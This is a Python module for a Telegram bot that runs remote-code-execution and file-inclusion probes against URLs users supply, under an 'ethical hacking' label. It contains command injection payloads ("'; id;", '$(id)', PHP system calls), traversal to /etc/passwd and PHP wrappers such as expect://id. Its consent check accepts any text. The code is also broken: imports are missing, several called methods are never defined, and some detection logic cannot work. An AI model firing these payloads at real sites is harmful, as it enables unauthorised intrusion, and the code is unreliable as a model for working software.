#!/usr/bin/env python3
"""
Ethical Hacking Utilities for Telegram Terminal Bot
Features for security testing and penetration testing with strict ethical guidelines
"""

import os
import re
import requests
import subprocess
import tempfile
import json
import logging
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse
import base64
import hashlib
from datetime import datetime
import socket
from enum import Enum

logger = logging.getLogger(__name__)

class EthicalHackingMode(Enum):
    DISABLED = "disabled"
    READ_ONLY = "read_only"  # Only safe, read-only tests
    LIMITED = "limited"      # Limited testing with restrictions
    FULL = "full"           # Full testing (admin only)

class VulnerabilityType(Enum):
    RCE = "rce"
    LFI = "lfi"
    SQLI = "sqli"
    XSS = "xss"
    XXE = "xxe"

@dataclass
class VulnerabilityTest:
    test_id: str
    vulnerability_type: VulnerabilityType
    target: str
    payload: str
    risk_level: str
    description: str
    safe_mode: bool

class EthicalHackingManager:
    """Manager for ethical hacking and penetration testing features"""
    
    def __init__(self, mode: EthicalHackingMode = EthicalHackingMode.READ_ONLY):
        self.mode = mode
        self.test_history = []
        self.approved_targets = set()
        self.consent_verified = {}
        self.vulnerability_database = {}
        self.ethical_guidelines = self.load_ethical_guidelines()
        
    def load_ethical_guidelines(self) -> Dict[str, str]:
        """Load ethical hacking guidelines and principles"""
        return {
            'principle_1': 'Only test systems you own or have explicit written permission to test',
            'principle_2': 'Never test systems without proper authorization and consent',
            'principle_3': 'Document all testing activities for accountability',
            'principle_4': 'Report all findings responsibly to appropriate parties',
            'principle_5': 'Do not cause permanent damage or data loss',
            'principle_6': 'Respect privacy and confidentiality of data',
            'principle_7': 'Follow responsible disclosure practices'
        }
    
    def verify_ethical_authorization(self, user_id: str, target: str, consent_document: str = None) -> Dict[str, Any]:
        """Verify ethical authorization before conducting tests"""
        try:
            # Check if user has provided consent documentation
            if not consent_document and self.mode != EthicalHackingMode.FULL:
                return {
                    'authorized': False,
                    'reason': 'Consent documentation required for ethical hacking',
                    'guidelines': self.ethical_guidelines
                }
            
            # Verify target is in approved list (for read-only mode)
            if self.mode == EthicalHackingMode.READ_ONLY:
                if target not in self.approved_targets:
                    return {
                        'authorized': False,
                        'reason': 'Target not in approved list for read-only mode',
                        'approved_targets': list(self.approved_targets)
                    }
            
            # Verify consent document hash (simplified)
            if consent_document:
                consent_hash = hashlib.sha256(consent_document.encode()).hexdigest()
                self.consent_verified[user_id] = {
                    'target': target,
                    'consent_hash': consent_hash,
                    'timestamp': datetime.utcnow().isoformat()
                }
            
            return {
                'authorized': True,
                'verification_id': secrets.token_hex(16),
                'ethical_guidelines': self.ethical_guidelines,
                'mode': self.mode.value
            }
            
        except Exception as e:
            logger.error(f"Error verifying ethical authorization: {e}")
            return {
                'authorized': False,
                'reason': f'Verification error: {str(e)}'
            }
    
    def test_remote_code_execution(self, target_url: str, user_id: str) -> Dict[str, Any]:
        """Test for Remote Code Execution vulnerabilities (ethical mode)"""
        try:
            # Verify ethical authorization
            auth_result = self.verify_ethical_authorization(user_id, target_url)
            if not auth_result['authorized']:
                return auth_result
            
            # Only proceed based on current mode
            if self.mode == EthicalHackingMode.READ_ONLY:
                return self.safe_rce_test(target_url, user_id)
            elif self.mode == EthicalHackingMode.LIMITED:
                return self.limited_rce_test(target_url, user_id)
            elif self.mode == EthicalHackingMode.FULL:
                return self.full_rce_test(target_url, user_id)
            else:
                return {
                    'test_performed': False,
                    'reason': 'Ethical hacking mode is disabled'
                }
                
        except Exception as e:
            logger.error(f"Error testing RCE for {target_url}: {e}")
            return {
                'test_performed': False,
                'error': str(e)
            }
    
    def safe_rce_test(self, target_url: str, user_id: str) -> Dict[str, Any]:
        """Perform safe RCE tests (read-only, non-intrusive)"""
        try:
            test_results = []
            
            # Test 1: Input validation detection
            safe_payloads = [
                'echo "test123"',
                'print("test123")',
                'console.log("test123")',
                '<?php echo "test123"; ?>'
            ]
            
            for payload in safe_payloads:
                result = self.detect_input_validation(target_url, payload)
                test_results.append(result)
            
            # Test 2: Error-based detection
            error_result = self.detect_error_based_rce(target_url)
            test_results.append(error_result)
            
            # Test 3: Time-based detection (safe)
            time_result = self.detect_time_based_rce_safe(target_url)
            test_results.append(time_result)
            
            # Log test for accountability
            self.log_ethical_test(user_id, target_url, VulnerabilityType.RCE, test_results)
            
            return {
                'test_performed': True,
                'vulnerability_detected': any(r.get('vulnerable', False) for r in test_results),
                'test_results': test_results,
                'mode': 'safe_read_only',
                'ethical_note': 'Only non-intrusive tests performed'
            }
            
        except Exception as e:
            logger.error(f"Error in safe RCE test: {e}")
            return {
                'test_performed': False,
                'error': str(e)
            }
    
    def limited_rce_test(self, target_url: str, user_id: str) -> Dict[str, Any]:
        """Perform limited RCE tests with restrictions"""
        try:
            test_results = []
            
            # Test with harmless payloads that reveal vulnerability without exploitation
            limited_payloads = [
                'echo "ethical_test_123456"',
                'id',  # Safe command that reveals system info
                'whoami',
                'pwd'
            ]
            
            for payload in limited_payloads:
                result = self.test_limited_payload(target_url, payload)
                test_results.append(result)
                
                # Stop if vulnerability confirmed
                if result.get('vulnerable', False):
                    break
            
            # Additional detection methods
            blind_result = self.detect_blind_rce_limited(target_url)
            test_results.append(blind_result)
            
            self.log_ethical_test(user_id, target_url, VulnerabilityType.RCE, test_results)
            
            return {
                'test_performed': True,
                'vulnerability_detected': any(r.get('vulnerable', False) for r in test_results),
                'test_results': test_results,
                'mode': 'limited_testing',
                'ethical_note': 'Limited testing with safe payloads'
            }
            
        except Exception as e:
            logger.error(f"Error in limited RCE test: {e}")
            return {
                'test_performed': False,
                'error': str(e)
            }
    
    def test_local_file_inclusion(self, target_url: str, user_id: str) -> Dict[str, Any]:
        """Test for Local File Inclusion vulnerabilities (ethical mode)"""
        try:
            # Verify ethical authorization
            auth_result = self.verify_ethical_authorization(user_id, target_url)
            if not auth_result['authorized']:
                return auth_result
            
            if self.mode == EthicalHackingMode.READ_ONLY:
                return self.safe_lfi_test(target_url, user_id)
            elif self.mode == EthicalHackingMode.LIMITED:
                return self.limited_lfi_test(target_url, user_id)
            elif self.mode == EthicalHackingMode.FULL:
                return self.full_lfi_test(target_url, user_id)
            else:
                return {
                    'test_performed': False,
                    'reason': 'Ethical hacking mode is disabled'
                }
                
        except Exception as e:
            logger.error(f"Error testing LFI for {target_url}: {e}")
            return {
                'test_performed': False,
                'error': str(e)
            }
    
    def safe_lfi_test(self, target_url: str, user_id: str) -> Dict[str, Any]:
        """Perform safe LFI tests (read-only, non-intrusive)"""
        try:
            test_results = []
            
            # Test 1: Path traversal detection without actual file access
            traversal_payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ]
            
            for payload in traversal_payloads:
                result = self.detect_path_traversal(target_url, payload)
                test_results.append(result)
            
            # Test 2: PHP wrapper detection
            wrapper_result = self.detect_php_wrappers(target_url)
            test_results.append(wrapper_result)
            
            # Test 3: Null byte injection detection
            null_result = self.detect_null_byte_injection(target_url)
            test_results.append(null_result)
            
            self.log_ethical_test(user_id, target_url, VulnerabilityType.LFI, test_results)
            
            return {
                'test_performed': True,
                'vulnerability_detected': any(r.get('vulnerable', False) for r in test_results),
                'test_results': test_results,
                'mode': 'safe_read_only',
                'ethical_note': 'Only detection without actual file access'
            }
            
        except Exception as e:
            logger.error(f"Error in safe LFI test: {e}")
            return {
                'test_performed': False,
                'error': str(e)
            }
    
    def detect_input_validation(self, target_url: str, payload: str) -> Dict[str, Any]:
        """Detect input validation issues"""
        try:
            # Send payload and analyze response
            test_url = urljoin(target_url, f"?input={payload}")
            response = requests.get(test_url, timeout=10)
            
            # Check for signs of poor input validation
            validation_issues = []
            
            if response.status_code == 200:
                # Check if payload is reflected without sanitization
                if payload in response.text:
                    validation_issues.append('payload_reflected')
                
                # Check for error messages that indicate poor validation
                if 'error' in response.text.lower() or 'exception' in response.text.lower():
                    validation_issues.append('error_disclosure')
            
            return {
                'payload': payload,
                'vulnerable': len(validation_issues) > 0,
                'issues': validation_issues,
                'status_code': response.status_code
            }
            
        except requests.RequestException as e:
            return {
                'payload': payload,
                'vulnerable': False,
                'error': str(e)
            }
    
    def detect_error_based_rce(self, target_url: str) -> Dict[str, Any]:
        """Detect RCE through error-based analysis"""
        try:
            error_payloads = [
                '"; ls;',
                "'; id;",
                '"; whoami;',
                '<?php system("id"); ?>',
                '`id`',
                '$(id)'
            ]
            
            vulnerabilities = []
            
            for payload in error_payloads:
                test_url = urljoin(target_url, f"?input={payload}")
                try:
                    response = requests.get(test_url, timeout=5)
                    
                    # Look for system command execution signs
                    if any(sign in response.text for sign in ['uid=', 'gid=', 'groups=', 'root']):
                        vulnerabilities.append({
                            'payload': payload,
                            'type': 'error_based',
                            'confidence': 'high'
                        })
                        
                except requests.RequestException:
                    continue
            
            return {
                'test_type': 'error_based_rce',
                'vulnerable': len(vulnerabilities) > 0,
                'findings': vulnerabilities
            }
            
        except Exception as e:
            return {
                'test_type': 'error_based_rce',
                'vulnerable': False,
                'error': str(e)
            }
    
    def detect_time_based_rce_safe(self, target_url: str) -> Dict[str, Any]:
        """Safe time-based RCE detection"""
        try:
            # Use very short delays that won't impact system performance
            time_payloads = [
                '"; sleep 0.1;',
                "'; sleep 0.1;",
                '`sleep 0.1`',
                '$(sleep 0.1)'
            ]
            
            time_differences = []
            
            for payload in time_payloads:
                start_time = time.time()
                
                try:
                    test_url = urljoin(target_url, f"?input={payload}")
                    response = requests.get(test_url, timeout=2)
                    end_time = time.time()
                    
                    time_diff = end_time - start_time
                    time_differences.append({
                        'payload': payload,
                        'response_time': time_diff
                    })
                    
                except requests.RequestException:
                    end_time = time.time()
                    time_diff = end_time - start_time
                    time_differences.append({
                        'payload': payload,
                        'response_time': time_diff,
                        'timeout': True
                    })
            
            # Analyze time differences
            avg_time = sum(td['response_time'] for td in time_differences) / len(time_differences)
            suspicious_delays = [td for td in time_differences if td['response_time'] > avg_time + 0.05]
            
            return {
                'test_type': 'time_based_rce_safe',
                'vulnerable': len(suspicious_delays) > 0,
                'time_differences': time_differences,
                'suspicious_delays': suspicious_delays
            }
            
        except Exception as e:
            return {
                'test_type': 'time_based_rce_safe',
                'vulnerable': False,
                'error': str(e)
            }
    
    def detect_path_traversal(self, target_url: str, payload: str) -> Dict[str, Any]:
        """Detect path traversal vulnerabilities"""
        try:
            test_url = urljoin(target_url, f"?file={payload}")
            response = requests.get(test_url, timeout=10)
            
            # Look for signs of successful traversal
            traversal_signs = []
            
            # Check for system file indicators
            system_indicators = [
                'root:',  # /etc/passwd
                'daemon:',  # /etc/passwd
                'localhost',  # /etc/hosts
                '127.0.0.1',  # /etc/hosts
                'boot.ini',  # Windows
                '[boot loader]'  # Windows boot.ini
            ]
            
            for indicator in system_indicators:
                if indicator in response.text:
                    traversal_signs.append(indicator)
            
            # Check for directory listing
            if '../' in response.text or '..\\' in response.text:
                traversal_signs.append('directory_traversal')
            
            return {
                'payload': payload,
                'vulnerable': len(traversal_signs) > 0,
                'signs': traversal_signs,
                'response_length': len(response.text)
            }
            
        except requests.RequestException as e:
            return {
                'payload': payload,
                'vulnerable': False,
                'error': str(e)
            }
    
    def detect_php_wrappers(self, target_url: str) -> Dict[str, Any]:
        """Detect PHP wrapper usage for LFI"""
        try:
            wrapper_payloads = [
                'php://filter/read=convert.base64-encode/resource=/etc/passwd',
                'php://input',
                'data://text/plain,test123',
                'expect://id'
            ]
            
            wrapper_results = []
            
            for wrapper in wrapper_payloads:
                test_url = urljoin(target_url, f"?file={wrapper}")
                try:
                    response = requests.get(test_url, timeout=10)
                    
                    # Check for wrapper-specific responses
                    if wrapper.startswith('php://filter') and 'test123' in response.text:
                        wrapper_results.append({
                            'wrapper': wrapper,
                            'vulnerable': True,
                            'type': 'filter_wrapper'
                        })
                    elif wrapper.startswith('data://') and response.status_code == 200:
                        wrapper_results.append({
                            'wrapper': wrapper,
                            'vulnerable': True,
                            'type': 'data_wrapper'
                        })
                    elif wrapper.startswith('expect://') and ('uid=' in response.text or 'gid=' in response.text):
                        wrapper_results.append({
                            'wrapper': wrapper,
                            'vulnerable': True,
                            'type': 'expect_wrapper'
                        })
                        
                except requests.RequestException:
                    continue
            
            return {
                'test_type': 'php_wrappers',
                'vulnerable': any(r['vulnerable'] for r in wrapper_results),
                'wrapper_results': wrapper_results
            }
            
        except Exception as e:
            return {
                'test_type': 'php_wrappers',
                'vulnerable': False,
                'error': str(e)
            }
    
    def generate_security_report(self, test_results: List[Dict]) -> Dict[str, Any]:
        """Generate comprehensive security testing report"""
        try:
            total_tests = len(test_results)
            vulnerable_tests = sum(1 for r in test_results if r.get('vulnerable', False))
            
            # Categorize vulnerabilities
            vulnerability_summary = {}
            for result in test_results:
                vuln_type = result.get('vulnerability_type', 'unknown')
                if result.get('vulnerable', False):
                    if vuln_type not in vulnerability_summary:
                        vulnerability_summary[vuln_type] = []
                    vulnerability_summary[vuln_type].append(result)
            
            # Risk assessment
            risk_level = self.assess_overall_risk(vulnerable_tests, total_tests, vulnerability_summary)
            
            # Recommendations
            recommendations = self.generate_security_recommendations(vulnerability_summary)
            
            return {
                'report_generated': datetime.utcnow().isoformat(),
                'total_tests': total_tests,
                'vulnerabilities_found': vulnerable_tests,
                'vulnerability_summary': vulnerability_summary,
                'overall_risk_level': risk_level,
                'recommendations': recommendations,
                'ethical_disclaimer': 'This report is generated for authorized security testing only'
            }
            
        except Exception as e:
            logger.error(f"Error generating security report: {e}")
            return {
                'report_generated': False,
                'error': str(e)
            }
    
    def assess_overall_risk(self, vulnerable_count: int, total_count: int, vuln_summary: Dict) -> str:
        """Assess overall risk level"""
        if total_count == 0:
            return 'NO_TESTS'
        
        vulnerability_ratio = vulnerable_count / total_count
        
        # Check for critical vulnerabilities
        critical_vulns = ['rce', 'lfi']
        has_critical = any(vuln_type in critical_vulns for vuln_type in vuln_summary.keys())
        
        if has_critical and vulnerability_ratio > 0.3:
            return 'CRITICAL'
        elif has_critical or vulnerability_ratio > 0.2:
            return 'HIGH'
        elif vulnerability_ratio > 0.1:
            return 'MEDIUM'
        elif vulnerable_count > 0:
            return 'LOW'
        else:
            return 'MINIMAL'
    
    def generate_security_recommendations(self, vulnerability_summary: Dict) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        if 'rce' in vulnerability_summary:
            recommendations.extend([
                'Implement input validation and sanitization',
                'Use parameterized queries',
                'Apply principle of least privilege',
                'Implement Web Application Firewall (WAF)',
                'Regular security code reviews'
            ])
        
        if 'lfi' in vulnerability_summary:
            recommendations.extend([
                'Implement proper file path validation',
                'Use whitelisting for allowed file paths',
                'Disable dangerous PHP wrappers',
                'Implement chroot jail or containerization',
                'Apply input filtering for file parameters'
            ])
        
        # General recommendations
        recommendations.extend([
            'Implement comprehensive input validation',
            'Use security headers (CSP, X-Content-Type-Options)',
            'Regular security testing and penetration testing',
            'Keep software and dependencies updated',
            'Implement security monitoring and alerting'
        ])
        
        return list(set(recommendations))  # Remove duplicates
    
    def log_ethical_test(self, user_id: str, target: str, vulnerability_type: VulnerabilityType, results: List[Dict]) -> None:
        """Log ethical hacking test for accountability"""
        try:
            test_log = {
                'timestamp': datetime.utcnow().isoformat(),
                'user_id': user_id,
                'target': target,
                'vulnerability_type': vulnerability_type.value,
                'test_results': results,
                'ethical_mode': self.mode.value,
                'consent_verified': user_id in self.consent_verified,
                'test_id': secrets.token_hex(16)
            }
            
            self.test_history.append(test_log)
            
            # Log to security audit system
            logger.info(f"Ethical test performed: {test_log['test_id']} by user {user_id} on {target}")
            
        except Exception as e:
            logger.error(f"Error logging ethical test: {e}")
    
    def get_test_statistics(self) -> Dict[str, Any]:
        """Get statistics of ethical hacking tests performed"""
        try:
            total_tests = len(self.test_history)
            tests_by_type = {}
            tests_by_mode = {}
            vulnerabilities_found = 0
            
            for test in self.test_history:
                vuln_type = test['vulnerability_type']
                mode = test['ethical_mode']
                
                tests_by_type[vuln_type] = tests_by_type.get(vuln_type, 0) + 1
                tests_by_mode[mode] = tests_by_mode.get(mode, 0) + 1
                
                # Count vulnerabilities found
                if any(r.get('vulnerable', False) for r in test['test_results']):
                    vulnerabilities_found += 1
            
            return {
                'total_tests': total_tests,
                'tests_by_type': tests_by_type,
                'tests_by_mode': tests_by_mode,
                'vulnerabilities_found': vulnerabilities_found,
                'success_rate': (vulnerabilities_found / total_tests * 100) if total_tests > 0 else 0
            }
            
        except Exception as e:
            logger.error(f"Error getting test statistics: {e}")
            return {}

# Command handlers untuk Telegram Bot
class EthicalHackingCommands:
    """Command handlers for ethical hacking features"""
    
    def __init__(self, ethical_manager: EthicalHackingManager):
        self.ethical_manager = ethical_manager
    
    async def ethical_hacking_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show ethical hacking help and guidelines"""
        help_text = """
ETHICAL HACKING FEATURES - SECURITY TESTING TOOLS

PRINSIP ETIS:
1. Hanya test sistem yang Anda miliki atau punya izin tertulis
2. Never test tanpa otorisasi yang tepat
3. Dokumentasikan semua aktivitas testing
4. Laporkan temuan secara bertanggung jawab
5. Jangan menyebabkan kerusakan permanen
6. Respect privasi dan kerahasiaan data
7. Ikuti praktik responsible disclosure

PERINTAH TERSEDIA:
/rce_test <target> - Test Remote Code Execution
/lfi_test <target> - Test Local File Inclusion
/security_report - Generate security testing report
/ethical_stats - Show testing statistics
/set_ethical_mode <mode> - Set ethical hacking mode

MODE ETHICAL:
- read_only: Hanya deteksi non-intrusif (default)
- limited: Testing terbatas dengan payload aman
- full: Testing lengkap (admin only)

UNTUK PENGGUNAAN ETIS SAJA!
        """
        
        await update.message.reply_text(help_text)
    
    async def rce_test_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Command to test Remote Code Execution vulnerabilities"""
        user_id = update.effective_user.id
        
        if not context.args:
            await update.message.reply_text(
                "Usage: /rce_test <target_url>\n"
                "Example: /rce_test https://example.com/test.php"
            )
            return
        
        target_url = context.args[0]
        
        # Perform RCE test
        result = self.ethical_manager.test_remote_code_execution(target_url, str(user_id))
        
        if result.get('test_performed', False):
            response = f"RCE Test Results for {target_url}:\n\n"
            
            if result.get('vulnerability_detected', False):
                response += "POTENTIAL VULNERABILITIES DETECTED!\n"
                response += f"Mode: {result.get('mode', 'unknown')}\n"
                response += f"Risk Level: {self.assess_risk_level(result)}\n\n"
                
                # Show test results
                for test_result in result.get('test_results', []):
                    if test_result.get('vulnerable', False):
                        response += f"- {test_result.get('test_type', 'unknown')}: VULNERABLE\n"
            else:
                response += "No vulnerabilities detected in this test.\n"
                response += f"Mode: {result.get('mode', 'unknown')}\n"
            
            response += f"\n{result.get('ethical_note', '')}"
            
            await update.message.reply_text(response)
            
            # Generate detailed report if vulnerabilities found
            if result.get('vulnerability_detected', False):
                detailed_report = self.ethical_manager.generate_security_report([result])
                await self.send_security_report(update, detailed_report)
                
        else:
            await update.message.reply_text(
                f"Test could not be performed: {result.get('reason', 'Unknown error')}"
            )
    
    async def lfi_test_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Command to test Local File Inclusion vulnerabilities"""
        user_id = update.effective_user.id
        
        if not context.args:
            await update.message.reply_text(
                "Usage: /lfi_test <target_url>\n"
                "Example: /lfi_test https://example.com/file.php"
            )
            return
        
        target_url = context.args[0]
        
        # Perform LFI test
        result = self.ethical_manager.test_local_file_inclusion(target_url, str(user_id))
        
        if result.get('test_performed', False):
            response = f"LFI Test Results for {target_url}:\n\n"
            
            if result.get('vulnerability_detected', False):
                response += "POTENTIAL VULNERABILITIES DETECTED!\n"
                response += f"Mode: {result.get('mode', 'unknown')}\n"
                response += f"Risk Level: {self.assess_risk_level(result)}\n\n"
                
                # Show test results
                for test_result in result.get('test_results', []):
                    if test_result.get('vulnerable', False):
                        response += f"- {test_result.get('test_type', 'unknown')}: VULNERABLE\n"
                        if 'signs' in test_result:
                            response += f"  Signs: {', '.join(test_result['signs'])}\n"
            else:
                response += "No vulnerabilities detected in this test.\n"
                response += f"Mode: {result.get('mode', 'unknown')}\n"
            
            response += f"\n{result.get('ethical_note', '')}"
            
            await update.message.reply_text(response)
            
        else:
            await update.message.reply_text(
                f"Test could not be performed: {result.get('reason', 'Unknown error')}"
            )
    
    async def security_report_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate comprehensive security testing report"""
        user_id = update.effective_user.id
        
        # Get test history for this user
        user_tests = [test for test in self.ethical_manager.test_history if test['user_id'] == str(user_id)]
        
        if not user_tests:
            await update.message.reply_text(
                "No security tests have been performed yet.\n"
                "Use /rce_test or /lfi_test to perform security testing."
            )
            return
        
        # Generate report
        report = self.ethical_manager.generate_security_report(user_tests)
        
        if report.get('report_generated', False):
            await self.send_security_report(update, report)
        else:
            await update.message.reply_text("Error generating security report.")
    
    async def ethical_stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show ethical hacking statistics"""
        user_id = update.effective_user.id
        
        stats = self.ethical_manager.get_test_statistics()
        
        response = f"Ethical Hacking Statistics for User {user_id}:\n\n"
        response += f"Total Tests: {stats.get('total_tests', 0)}\n"
        response += f"Vulnerabilities Found: {stats.get('vulnerabilities_found', 0)}\n"
        response += f"Success Rate: {stats.get('success_rate', 0):.1f}%\n\n"
        
        if stats.get('tests_by_type'):
            response += "Tests by Type:\n"
            for test_type, count in stats['tests_by_type'].items():
                response += f"  - {test_type}: {count}\n"
        
        if stats.get('tests_by_mode'):
            response += "\nTests by Mode:\n"
            for mode, count in stats['tests_by_mode'].items():
                response += f"  - {mode}: {count}\n"
        
        await update.message.reply_text(response)
    
    def assess_risk_level(self, test_result: Dict) -> str:
        """Assess risk level from test results"""
        vulnerable_count = sum(1 for r in test_result.get('test_results', []) if r.get('vulnerable', False))
        total_tests = len(test_result.get('test_results', []))
        
        if total_tests == 0:
            return 'UNKNOWN'
        
        ratio = vulnerable_count / total_tests
        
        if ratio > 0.5:
            return 'CRITICAL'
        elif ratio > 0.3:
            return 'HIGH'
        elif ratio > 0.1:
            return 'MEDIUM'
        elif vulnerable_count > 0:
            return 'LOW'
        else:
            return 'MINIMAL'
    
    async def send_security_report(self, update: Update, report: Dict[str, Any]):
        """Send detailed security report"""
        try:
            response = "DETAILED SECURITY REPORT\n"
            response += "=" * 30 + "\n\n"
            
            response += f"Report Generated: {report.get('report_generated', 'Unknown')}\n"
            response += f"Total Tests: {report.get('total_tests', 0)}\n"
            response += f"Vulnerabilities Found: {report.get('vulnerabilities_found', 0)}\n"
            response += f"Overall Risk Level: {report.get('overall_risk_level', 'UNKNOWN')}\n\n"
            
            if report.get('vulnerability_summary'):
                response += "VULNERABILITY SUMMARY:\n"
                for vuln_type, findings in report['vulnerability_summary'].items():
                    response += f"\n{vuln_type.upper()} ({len(findings)} findings):\n"
                    for finding in findings[:3]:  # Show first 3
                        response += f"  - {finding.get('test_type', 'unknown')}\n"
                    if len(findings) > 3:
                        response += f"  ... and {len(findings) - 3} more\n"
            
            if report.get('recommendations'):
                response += "\nSECURITY RECOMMENDATIONS:\n"
                for i, rec in enumerate(report['recommendations'], 1):
                    response += f"{i}. {rec}\n"
            
            response += f"\n{report.get('ethical_disclaimer', '')}"
            
            # Split long messages if needed
            if len(response) > 4000:
                parts = self.split_long_message(response)
                for part in parts:
                    await update.message.reply_text(part)
            else:
                await update.message.reply_text(response)
                
        except Exception as e:
            logger.error(f"Error sending security report: {e}")
            await update.message.reply_text("Error sending detailed report.")

# Integration with main bot
def initialize_ethical_hacking_features(mode: str = 'read_only') -> EthicalHackingCommands:
    """Initialize ethical hacking features for the bot"""
    try:
        ethical_mode = EthicalHackingMode(mode)
        ethical_manager = EthicalHackingManager(ethical_mode)
        ethical_commands = EthicalHackingCommands(ethical_manager)
        
        logger.info(f"Ethical hacking features initialized with mode: {mode}")
        return ethical_commands
        
    except Exception as e:
        logger.error(f"Error initializing ethical hacking features: {e}")
        return None

# Example usage in main bot
if __name__ == "__main__":
    # Initialize ethical hacking features
    ethical_commands = initialize_ethical_hacking_features('read_only')
    
    if ethical_commands:
        print("Ethical hacking features ready for deployment")
        print("Available commands: /rce_test, /lfi_test, /security_report, /ethical_stats")
    else:
        print("Failed to initialize ethical hacking features")